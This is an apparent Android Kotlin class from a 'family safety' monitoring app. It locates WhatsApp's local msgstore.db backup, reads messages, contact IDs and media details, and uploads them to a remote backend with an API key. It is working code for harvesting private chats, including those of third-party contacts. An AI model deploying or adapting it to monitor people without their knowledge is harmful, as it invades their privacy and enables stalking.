package com.familysafety.agent

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.os.Build
import android.os.Environment
import android.util.Log
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

/**
 * WhatsApp backup okuyucu — /sdcard/WhatsApp/Databases/msgstore.db
 *
 * Kısıtlamalar:
 * - Android 10+: MANAGE_EXTERNAL_STORAGE izni gerekir
 * - Şifreli backup (crypt12/14/15): 32-byte hex key gerektirir
 * - Root olmadan sadece şifresiz backup okunabilir
 *
 * Önerilen kullanım: WhatsApp Agent (Node.js) canlı oturum daha güvenilir.
 * Bu sınıf ek kaynak olarak local backup mevcutsa kullanılır.
 */
class WhatsAppReader(private val context: Context) {

    companion object {
        private const val TAG = "WhatsAppReader"
        private val WA_DB_PATHS = listOf(
            "/sdcard/WhatsApp/Databases/msgstore.db",
            "/sdcard/Android/media/com.whatsapp/WhatsApp/Databases/msgstore.db",
        )
        private val WA_CRYPT_PATHS = listOf(
            "/sdcard/WhatsApp/Databases/msgstore.db.crypt15",
            "/sdcard/WhatsApp/Databases/msgstore.db.crypt14",
            "/sdcard/WhatsApp/Databases/msgstore.db.crypt12",
            "/sdcard/Android/media/com.whatsapp/WhatsApp/Databases/msgstore.db.crypt15",
        )
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    // ── İzin kontrolü ─────────────────────────────────────────────────────────

    fun hasStorageAccess(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            context.checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) ==
                    android.content.pm.PackageManager.PERMISSION_GRANTED
        }
    }

    // ── Backup dosyası konumu ──────────────────────────────────────────────────

    fun findDatabase(): File? = WA_DB_PATHS.map { File(it) }.firstOrNull { it.exists() }

    fun findEncryptedDatabase(): File? = WA_CRYPT_PATHS.map { File(it) }.firstOrNull { it.exists() }

    fun getDatabaseStatus(): String {
        if (!hasStorageAccess()) return "PERMISSION_DENIED"
        findDatabase()?.let { return "UNENCRYPTED:${it.absolutePath}" }
        findEncryptedDatabase()?.let { return "ENCRYPTED:${it.absolutePath}" }
        return "NOT_FOUND"
    }

    // ── Şifresiz backup okuma ─────────────────────────────────────────────────

    fun readMessages(limit: Int = 500): List<Map<String, Any>> {
        if (!hasStorageAccess()) {
            Log.w(TAG, "Depolama izni yok")
            return emptyList()
        }
        val dbFile = findDatabase() ?: run {
            Log.w(TAG, "Şifresiz backup bulunamadı. Status: ${getDatabaseStatus()}")
            return emptyList()
        }
        return readSQLite(dbFile, limit)
    }

    private fun readSQLite(dbFile: File, limit: Int): List<Map<String, Any>> {
        val messages = mutableListOf<Map<String, Any>>()
        var db: SQLiteDatabase? = null
        try {
            db = SQLiteDatabase.openDatabase(
                dbFile.absolutePath, null, SQLiteDatabase.OPEN_READONLY
            )
            // WhatsApp mesaj tablosu — cihaza ve versiyona göre farklı olabilir
            val table = if (tableExists(db, "message")) "message" else "messages"
            val cursor = db.rawQuery(
                """SELECT
                    key_id, key_remote_jid, key_from_me, status,
                    data, timestamp, media_url, media_mime_type, media_size,
                    received_timestamp, send_timestamp
                   FROM $table
                   WHERE data IS NOT NULL
                   ORDER BY timestamp DESC
                   LIMIT ?""",
                arrayOf(limit.toString())
            )
            cursor.use {
                while (it.moveToNext()) {
                    messages.add(
                        mapOf(
                            "id"         to (it.getString(0) ?: ""),
                            "jid"        to (it.getString(1) ?: ""),
                            "from_me"    to (it.getInt(2) == 1),
                            "status"     to it.getInt(3),
                            "body"       to (it.getString(4) ?: ""),
                            "timestamp"  to it.getLong(5),
                            "media_url"  to (it.getString(6) ?: ""),
                            "media_type" to (it.getString(7) ?: ""),
                            "media_size" to it.getLong(8),
                        )
                    )
                }
            }
            Log.i(TAG, "${messages.size} WhatsApp mesajı okundu")
        } catch (e: Exception) {
            Log.e(TAG, "SQLite okuma hatası: ${e.message}")
        } finally {
            db?.close()
        }
        return messages
    }

    private fun tableExists(db: SQLiteDatabase, name: String): Boolean {
        val cursor = db.rawQuery(
            "SELECT name FROM sqlite_master WHERE type='table' AND name=?", arrayOf(name)
        )
        return cursor.use { it.count > 0 }
    }

    // ── Backend'e gönder ──────────────────────────────────────────────────────

    fun syncToBackend(messages: List<Map<String, Any>>) {
        if (messages.isEmpty()) return
        Thread {
            try {
                val arr = JSONArray()
                messages.forEach { msg ->
                    arr.put(JSONObject().apply {
                        msg.forEach { (k, v) -> put(k, v) }
                    })
                }
                val body = JSONObject().apply {
                    put("messages", arr)
                    put("source", "local_backup")
                }.toString().toRequestBody("application/json".toMediaTypeOrNull())

                val req = Request.Builder()
                    .url("${Config.backendUrl}/api/whatsapp-backup/${Config.profileId}")
                    .addHeader("X-API-Key", Config.API_KEY)
                    .post(body)
                    .build()

                client.newCall(req).execute().use { resp ->
                    if (resp.isSuccessful) Log.i(TAG, "Backend sync: ${messages.size} mesaj")
                    else Log.e(TAG, "Backend sync başarısız: HTTP ${resp.code}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Backend sync hatası: ${e.message}")
            }
        }.start()
    }

    // ── Tam akış: oku + gönder ────────────────────────────────────────────────

    fun readAndSync(limit: Int = 500) {
        val messages = readMessages(limit)
        if (messages.isNotEmpty()) syncToBackend(messages)
        else Log.i(TAG, "Senkronize edilecek mesaj yok. Status: ${getDatabaseStatus()}")
    }
}
